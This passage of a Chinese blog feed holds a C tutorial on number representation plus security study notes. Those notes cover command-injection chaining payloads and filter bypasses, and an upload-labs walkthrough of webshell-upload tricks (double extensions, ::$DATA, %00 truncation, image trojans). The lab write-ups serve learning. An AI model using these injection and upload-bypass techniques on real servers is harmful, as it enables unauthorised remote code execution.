%lX</td></tr></tbody></table><p>十六进制数字的表示用到了英文字母，有大小写之分，要在格式控制符中体现出来：</p><ul><li><p>%hx、%x 和 %lx 中的x小写，表明以小写字母的形式输出十六进制数；</p></li><li><p>%hX、%X 和 %lX 中的X大写，表明以大写字母的形式输出十六进制数。<br>八进制数字和十进制数字不区分大小写，所以格式控制符都用小写形式。如果你比较叛逆，想使用大写形式，那么行为是未定义的，请你慎重：</p></li><li><p>有些编译器支持大写形式，只不过行为和小写形式一样；</p></li><li><p>有些编译器不支持大写形式，可能会报错，也可能会导致奇怪的输出。</p></li></ul><h3 id="C语言中的正负数及其输出"><a href="#C语言中的正负数及其输出" class="headerlink" title="C语言中的正负数及其输出"></a>C语言中的正负数及其输出</h3><p>在数学中，数字有正负之分。在C语言中也是一样，short、int、long 都可以带上正负号，例如：<br>如果不带正负号，默认就是正数。 符号也是数字的一部分，也要在内存中体现出来。符号只有正负两种情况，用1位就足以表示；C语言规定，把内存的最高位作为符号位。以 int 为例，它占用 32 位的内存，0~30 位表示数值，31 位表示正负号。</p><p>short、int、long 中就没有符号位了，所有的位都用来表示数值，正数的取值范围更大了。这也意味着，使用了 unsigned 后只能表示正数，不能再表示负数了。 如果将一个数字分为符号和数值两部分，那么不加 unsigned 的数字称为有符号数，能表示正数和负数，加了 unsigned 的数字称为无符号数，只能表示正数。 请读者注意一个小细节，如果是unsigned int类型，那么可以省略 int ，只写 unsigned</p><p>无符号数可以以八进制、十进制和十六进制的形式输出，它们对应的格式控制符分别为：</p><table><thead><tr><th align="left">进制&#x2F;数据类型</th><th align="left">unsigned short</th><th align="left">unsigned int</th><th align="left">unsigned long</th></tr></thead><tbody><tr><td align="left">八进制</td><td align="left">%ho</td><td align="left">%o</td><td align="left">%lo</td></tr><tr><td align="left">十进制</td><td align="left">%hu</td><td align="left">%u</td><td align="left">%lu</td></tr><tr><td align="left">十六进制</td><td align="left">%hx 或者 %hX</td><td align="left">%x 或者 %X</td><td align="left">%lx 或者 %lX</td></tr></tbody></table><h3 id="整数在内存中是如何存储的"><a href="#整数在内存中是如何存储的" class="headerlink" title="整数在内存中是如何存储的"></a>整数在内存中是如何存储的</h3><ol><li>原码<br> 将一个整数转换成二进制形式，就是其原码。<br> 例如short a &#x3D; 6；<br> a的原码就是0000 0000 0000 0110;<br> 更改a的值a &#x3D; -18，此时a的原码就是1000 0000 0001 0010。<br> 通俗的理解，原码就是一个整数本来的二进制形式</li><li>反码<br> 谈到反码，需要将正数和负数区别对待，因为它们的反码不一样。<br> 对于正数，它的反码就是其原码（原码和反码相同）；<br> 负数的反码就是将原码中除符号位以外的所有位（数值位）取反，也就是0变成1,1变成0.。<br> 例如short a &#x3D; 6，a的原码和反码都是0000 0000 0000 0110；<br> 更改a的值a &#x3D; -18，此时a的反码是 1111 1111 1110 1101.</li><li>补码<br> 正数和负数的补码也不一样，也要区别对待。<br> 对于正数，它的补码就是其原码（原码、反码、补码都相同）；<br> 负数的补码是其反码加 1。<br> 例如short a &#x3D; 6;，a 的原码、反码、补码都是0000 0000 0000 0110；<br> 更改 a 的值a &#x3D; -18;，此时 a 的补码是1111 1111 1110 1110。<br>可以认为，补码是在反码的基础上打了一个补丁，进行了一下修正，所以叫“补码”。<br> 原码、反码、补码的概念只对负数有实际意义，对于正数，它们都一样。<br>最后我们总结一下 6 和 -18 从原码到补码的转换过程：</li></ol><p>在计算机内存中，整数一律采用补码的形式来存储。这意味着，当读取整数时还要采用逆向的转换，也就是将补码转换为原码。将补码转换为原码也很简单：先减去 1，再将数值位取反即可。</p><p> 补码到底是如何简化电路的<br>假设 6 和 18 都是 short 类型的，现在我们要计算 6 - 18 的结果，根据运算规则，它等价于 6 + (-18)。<br>如果采用原码计算，那么运算过程为：<br> 6 - 18 &#x3D; 6 + (-18) &#x3D; [0000 0000 0000 0110]原 + [1000 0000 0001 0010]原 &#x3D; [1000 0000 0001 1000]原 &#x3D; -24<br> 直接用原码表示整数，让符号位也参与运算，对于类似上面的减法来说，结果显然是不正确的。<br> 于是人们开始继续探索，不断试错，后来设计出了反码。下面就演示了反码运算的过程：<br> 6 - 18 &#x3D; 6 + (-18) &#x3D; [0000 0000 0000 0110]反 + [1111 1111 1110 1101]反 &#x3D; [1111 1111 1111 0011]反 &#x3D; [1000 0000 0000 1100]原 &#x3D; -12<br> 这样一来，计算结果就正确了。<br>然而，这样还不算万事大吉，我们不妨将减数和被减数交换一下位置，也就是计算 18 - 6 的结果：<br> 18 - 6 &#x3D; 18 + (-6) &#x3D; [0000 0000 0001 0010]反 + [1111 1111 1111 1001]反 &#x3D; [<strong>1</strong> 0000 0000 0000 1011]反 &#x3D; [0000 0000 0000 1011]原 &#x3D; 11<br> 按照反码计算的结果是 11，而真实的结果应该是 12 才对，它们相差了 1。<br>加粗的 1 是加法运算过程中的进位，它溢出了，内存容纳不了了，所以直接截掉。<br> 6 - 18 的结果正确，18 - 6 的结果就不正确，相差 1。按照反码来计算，是不是小数减去大数正确，大数减去小数就不对了，始终相差 1 呢？我们不妨再看两个例子，分别是 5 - 13 和 13 - 5。<br>5 - 13 的运算过程为：<br> 5 - 13 &#x3D; 5 + (-13) &#x3D; [0000 0000 0000 0101]原 + [1000 0000 0000 1101]原 &#x3D; [0000 0000 0000 0101]反 + [1111 1111 1111 0010]反 &#x3D; [1111 1111 1111 0111]反 &#x3D; [1000 0000 0000 1000]原 &#x3D; -8<br> 13 - 5 的运算过程为：<br>13 - 5 &#x3D; 13 + (-5) &#x3D; [0000 0000 0000 1101]原 + [1000 0000 0000 0101]原 &#x3D; [0000 0000 0000 1101]反 + [1111 1111 1111 1010]反 &#x3D; [1 0000 0000 0000 0111]反 &#x3D; [0000 0000 0000 0111]原 &#x3D; 7<br> 这足以证明，刚才的猜想是正确的：小数减去大数不会有问题，而大数减去小数的就不对了，结果始终相差 1。<br> 相差的这个 1 要进行纠正，但是又不能影响小数减去大数，怎么办呢？于是人们又绞尽脑汁设计出了补码，给反码打了一个“补丁”，终于把相差的 1 给纠正过来了。<br> 下面演示了按照补码计算的过程：<br>6 - 18 &#x3D; 6 + (-18) &#x3D; [0000 0000 0000 0110]补 + [1111 1111 1110 1110]补 &#x3D; [1111 1111 1111 0100]补 &#x3D; [1111 1111 1111 0011]反 &#x3D; [1000 0000 0000 1100]原 &#x3D; -12<br> 18 - 6 &#x3D; 18 + (-6) &#x3D; [0000 0000 0001 0010]补 + [1111 1111 1111 1010]补 &#x3D; [1 0000 0000 0000 1100]补 &#x3D; [0000 0000 0000 1100]反 &#x3D; [0000 0000 0000 1100]原 &#x3D; 12<br> 5 - 13 &#x3D; 5 + (-13) &#x3D; [0000 0000 0000 0101]补 + [1111 1111 1111 0011]补 &#x3D; [1111 1111 1111 1000]补 &#x3D; [1000 1111 1111 0111]反 &#x3D; [1000 0000 0000 1000]原 &#x3D; -8<br> 13 - 5 &#x3D; 13 + (-5) &#x3D; [0000 0000 0000 1101]补 + [1111 1111 1111 1011]补 &#x3D; [1 0000 0000 0000 1000]补 &#x3D; [0000 0000 0000 1000]反 &#x3D; [0000 0000 0000 1000]原 &#x3D; 8<br>你看，采用补码的形式正好把相差的 1 纠正过来，也没有影响到小数减去大数，这个“补丁”真是巧妙。<br>小数减去大数，结果为负数，之前（负数从反码转换为补码要加 1）加上的 1，后来（负数从补码转换为反码要减 1）还要减去，正好抵消掉，所以不会受影响。<br> 而大数减去小数，结果为正数，之前（负数从反码转换为补码要加 1）加上的 1，后来（正数的补码和反码相同，从补码转换为反码不用减 1）就没有再减去，不能抵消掉，这就相当于给计算结果多加了一个 1。</p><h3 id="C语言中的小数（float-double）"><a href="#C语言中的小数（float-double）" class="headerlink" title="C语言中的小数（float,double）"></a>C语言中的小数（float,double）</h3><p> 小数分为整数部分和小数部分，它们由点号.分隔，例如 0.0、75.0、4.023、0.27、-937.198 -0.27 等都是合法的小数，这是最常见的小数形式，我们将它称为十进制形式。 此外，小数也可以采用指数形式，例如 7.25×102、0.0368×105、100.22×10-2、-27.36×10-3 等。任何小数都可以用指数形式来表示。 C语言同时支持以上两种形式的小数。但是在书写时，C语言中的指数形式和数学中的指数形式有所差异。 C语言中小数的指数形式为：aEn 或 aen<br> a 为尾数部分，是一个十进制数；n 为指数部分，是一个十进制整数；E或e是固定的字符，用于分割尾数部分和指数部分。整个表达式等价于 a×10n。 指数形式的小数举例：</p><ul><li><p>2.1E5 &#x3D; 2.1×10 5，其中 2.1 是尾数，5 是指数。</p></li><li><p>3.7E-2 &#x3D; 3.7×10-2，其中 3.7 是尾数，-2 是指数。</p></li><li><p>0.5E7 &#x3D; 0.5×10 7，其中 0.5 是尾数，7 是指数。</p></li></ul><h4 id="小数的输出"><a href="#小数的输出" class="headerlink" title="小数的输出"></a>小数的输出</h4><p>小数也可以使用 printf 函数输出，包括十进制形式和指数形式，它们对应的格式控制符分别是：</p><ul><li><p>%f 以十进制形式输出 float 类型；</p></li><li><p>%lf 以十进制形式输出 double 类型；</p></li><li><p>%e 以指数形式输出 float 类型，输出结果中的 e 小写；</p></li><li><p>%E 以指数形式输出 float 类型，输出结果中的 E 大写；</p></li><li><p>%le 以指数形式输出 double 类型，输出结果中的 e 小写；</p></li><li><p>%lE 以指数形式输出 double 类型，输出结果中的 E 大写。</p></li></ul><h3 id="数字的后缀"><a href="#数字的后缀" class="headerlink" title="数字的后缀"></a>数字的后缀</h3><p>一个数字，是有默认类型的：对于整数，默认是 int 类型；对于小数，默认是 double 类型。 请看下面的例子：<br>long a &#x3D; 100;int b &#x3D; 294;float x &#x3D; 52.55;double y &#x3D; 18.6;<br>100 和 294 这两个数字默认都是 int 类型的，将 100 赋值给 a，必须先从 int 类型转换为 long 类型，而将 294 赋值给 b 就不用转换了。 52.55 和 18.6 这两个数字默认都是 double 类型的，将 52.55 赋值给 x，必须先从 double 类型转换为 float 类型，而将 18.6 赋值给 y 就不用转换了。 如果不想让数字使用默认的类型，那么可以给数字加上后缀，手动指明类型：</p><ul><li><p>在整数后面紧跟 l 或者 L（不区分大小写）表明该数字是 long 类型；</p></li><li><p>在小数后面紧跟 f 或者 F（不区分大小写）表明该数字是 float 类型。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记3-RCE,upload-labs,XSS-labs</title>
      <link href="/2023/10/22/%E5%91%A8%E8%AE%B0-2023-10-22-%E5%91%A8%E8%AE%B03/"/>
      <url>/2023/10/22/%E5%91%A8%E8%AE%B0-2023-10-22-%E5%91%A8%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<h2 id="rce-命令执行"><a href="#rce-命令执行" class="headerlink" title="rce-命令执行"></a>rce-命令执行</h2><p><img src="https://img-blog.csdnimg.cn/20210720130814355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pZ28xMzQ=,size_16,color_FFFFFF,t_70" alt="1"></p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。</p><h3 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h3><p>1.system() 将字符串作为OS命令执行，自带输出功能。<br>2.passthru() 将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。<br>3.exec() 将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。<br>4.shell_exec() 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。<br>5.popen()&#x2F;proc_open() 该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&quot;&gt;&gt; 1.txt&quot;</span>;</span><br><span class="line"> <span class="comment">//此时的$cmd=ipconfig &gt;&gt; 1.txt</span></span><br><span class="line"> <span class="title function_ invoke__">popen</span>(<span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>,<span class="string">&#x27;r&#x27;</span>); <span class="comment">//实际上就是 popen(&quot;ipconfig &gt;&gt; 1.txt&quot;, &quot;r&quot;),把执行结果放入1.txt文件，通过访问1.txt文件查看执行结果。</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>6.pcntl_exec() 用的很少不多赘述</p><p>此外php还自带一些能进行命令执行的代码,其中最常见的就是eval()函数</p><p>此函数能将输入的内容当作代码执行</p><p>下面列出一些常用的命令执行手段</p><h3 id="Windows下连接两条命令"><a href="#Windows下连接两条命令" class="headerlink" title="Windows下连接两条命令"></a>Windows下连接两条命令</h3><ul><li>| 直接执行后面的语句，如ping &lt;<a href="http://www.baidu.com|whoami>">www.baidu.com|whoami&gt;</a></li><li>|| 如果前面的语句执行出错，则执行后面的。如ping 2||whoami</li><li>&amp; 前面的语句可真可假。如ping 2&amp;whoami</li><li>&amp;&amp; 前面的语句为真时，才执行后面的语句。如ping &lt;<a href="http://www.baidu.com>">www.baidu.com&gt;</a> &amp;&amp; whoami</li></ul><h3 id="Linux下连接两条命令"><a href="#Linux下连接两条命令" class="headerlink" title="Linux下连接两条命令"></a>Linux下连接两条命令</h3><ul><li>| 管道符，直接执行后面的语句，如ping -c 4 127.0.0.1 | whoami</li><li>|| 如果前面的语句执行出错，则执行后面的。如ping -c 4 2 || whoami</li><li>; 执行完前面的，直接执行后面的；如ping -c 4 127.0.0.1; whoami</li><li>&amp;&amp; 前面的语句为真时，才执行后面的语句。如ping -c 4 127.0.0.1 &amp;&amp; whoami</li></ul><h3 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h3><p>有时题目会对输入内容进行一些限制,即黑名单过滤,我们就要尝试绕过过滤并能实现正常的作用</p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>常用${IFS}或者%09替代</p><p>或者可以这样输入:</p><ul><li>{cat,flag}</li><li>cat&lt;flag</li><li>cat&lt;&gt;flag</li></ul><h4 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h4><ul><li>通配符(如:&#x2F;f*或&#x2F;fl??)</li><li>变量拼接</li><li>反引号</li><li>反斜杠</li><li>引号</li><li>编码绕过(例如url编码:需要get请求传参或base64,Hex编码)</li></ul><h3 id="无参函数RCE"><a href="#无参函数RCE" class="headerlink" title="无参函数RCE"></a>无参函数RCE</h3><p>可以写python脚本输出需要的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输出text取反并url编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>(<span class="params">text</span>):</span><br><span class="line">     result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">          temp = <span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="built_in">ord</span>(i))^<span class="number">0xff</span>)</span><br><span class="line">          temp = <span class="built_in">str</span>(temp).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">          result += temp</span><br><span class="line">     <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="XSS-labs"><a href="#XSS-labs" class="headerlink" title="XSS-labs"></a>XSS-labs</h2><p>详细内容见我的这篇博客,过程和思路都在这里:</p><p><a href="https://yantm666.github.io/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-XSS-labs/">https://yantm666.github.io/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-XSS-labs/</a></p><h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><p>详细内容见我的这篇博客,过程和思路都在这里:</p><p><a href="https://yantm666.github.io/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-upload-labs/">https://yantm666.github.io/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-upload-labs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-upload-labs/"/>
      <url>/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-upload-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传靶场"><a href="#文件上传靶场" class="headerlink" title="文件上传靶场"></a>文件上传靶场</h2><p>一些知识点详见周记2的文件上传部分:<br><a href="https://hades-blog.github.io/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/">https://Hades-blog.github.io/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/</a></p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>第一题简单的前端验证,禁用js传shell或者改合法后缀抓包</p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>绕MIME检查,抓包改请求头的Content-Type部分为合法(例如image&#x2F;png)格式绕过</p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>黑名单过滤不全,可以改后缀为能生效但能绕过检测的不常用后缀,如.php3,.php4等</p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>没过滤.htaccess后缀,那么可以传此文件使shell图片在后台生效</p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>user.ini绕过,上传此文件并上传shell图片,使shell包含进后台自带的php文件中</p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>没过滤大小写,可以改后缀为.pHP成功绕过</p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>后端检测没有去掉首尾空格，于是上传 shell.php+空格</p><p>那么这样的后缀就能绕过检测</p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>源码中没有过滤 .</p><p>上传时文件名为shell.php.，绕过对后缀的检查</p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>源码中未对 ::$DATA 过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名</span><br><span class="line">且保持::$DATA之前的文件名，他的目的就是不检查后缀名</span><br><span class="line">例如:&quot;shell.php::$DATA&quot;Windows会自动去掉末尾的::$DATA变成&quot;shell.php&quot;</span><br></pre></td></tr></table></figure><p>上传shell.php::$DATA绕过</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 <span class="title function_ invoke__">deldot</span>() 删除文件名末尾的点</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">deldot</span>() 函数从末尾向前检测，检测到第一个点后，会继续向前检测，但遇到空格会停下来</span><br></pre></td></tr></table></figure><p>可以构造文件名:shell.php. . 绕过检测</p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>源码中 使用 str_ireplace 不区分大小写替换，只是替换了一次，我们可以利用双写绕过检查</p><p>上传文件名 ：shell.p.phphp</p><p>上传时会被删除 .php</p><p>最后的上传文件名：shell.php</p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strrpos</span>(<span class="keyword">string</span>,find,start) 函数查找字符串在另一字符串中最后一次出 现的位置（区分大小写）。</span><br><span class="line"><span class="title function_ invoke__">substr</span>(<span class="keyword">string</span>,start,length) 函数返回字符串的一部分*(从start开始 ，长度为 length)</span><br></pre></td></tr></table></figure><p>源码中对后缀进行白名单检测，只允许 jpg ，png，gif</p><p>首先我们上传的是一个php文件，首先要抓包更改它的后缀名来绕过白名单验证</p><p>但最终文件的存放位置是以拼接的方式，可以使用%00截断</p><ol><li>上传shell.jpg的一句话木马</li><li>save_path&#x3D;..&#x2F;upload&#x2F;shell.php%00</li><li>成功上传后，%00后的不会被识别</li></ol><p><img src="https://pic4.zhimg.com/v2-6e7c88a0a5df47cd8face3d4c667ff7f_r.jpg" alt="1"></p><p>原理：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。</p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>与上题原理类似,不过本题是利用post请求传路径,所以用0x00截断</p><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>这一关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件<br>使用</p><p>且题目提示存在文件包含漏洞,那么我们可以使用 图片马 + 文件包含 绕过</p><p>上传图片马后利用文件包含构造url,使用蚁剑连接</p><p>(一句话木马前写两个占位符好改一些)</p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>通过使用getimagesize()检查是否为图片文件,所以与上题方法一样</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>exif_imagetype()读取一个图像的第一个字节并检查其后缀名。<br>返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启php_exif模块。</p><p>所以与上题做法一致</p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>这一关对上传图片进行了判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，但是后端二次渲染需要找到渲染后的图片里面没有发生变化的Hex地方，添加一句话，通过文件包含漏洞执行一句话，使用蚁剑进行连接</p><p>对于做文件上传之二次渲染建议用GIF图片，相对于简单一点</p><p>上传正常的GIF图片下载回显的图片，用010Editor编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）并插入PHP一句话木马，上传带有PHP一句话木马的GIF图片</p><hr><p>注意:二次渲染不会渲染已经被渲染过的文件,我们可以将第一次渲染后的图片写入一句话木马再进行上传就不会被渲染</p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>题目提示需要代码审计,那我们来看下部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 